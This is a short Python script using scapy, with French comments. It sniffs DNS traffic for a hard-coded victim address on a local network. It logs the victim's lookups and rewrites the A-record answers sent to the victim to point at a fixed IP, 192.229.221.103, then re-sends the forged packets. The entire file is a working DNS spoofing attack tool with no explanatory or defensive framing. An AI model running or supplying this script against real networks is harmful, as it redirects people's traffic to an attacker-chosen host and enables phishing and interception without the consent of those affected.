#! /usr/bin/env python
from scapy.all import *
import time

cible="192.168.0.25"

def dnspacket(pkt):

	if(pkt.getlayer(IP).dst==cible):
		#pasbaux
		if(pkt.ancount):
			if(pkt.an.type==1):
				print("réponse: ")
				print(pkt.an.rdata)
				#print(pkt.show())
				#print(pkt.an.type)
				print(pkt.show())
				print("on  altère")
				pkt.an.rdata="192.229.221.103"
				pkt.getlayer(UDP).chksum=0x0000
				print(pkt.show())
				sr1(pkt,retry=1,timeout=0)


	if(pkt.getlayer(IP).src==cible):
		# print("ESLE")
		#print(pkt.qd.qtype)
		if(pkt.qd.qtype==1):
			print("Requette: ")
			print(pkt.qd.qname)
			#print(pkt.show())
			#print(pkt.qd.qtype)

sniff(prn=dnspacket, filter="port 53", store=0, iface="Ethernet")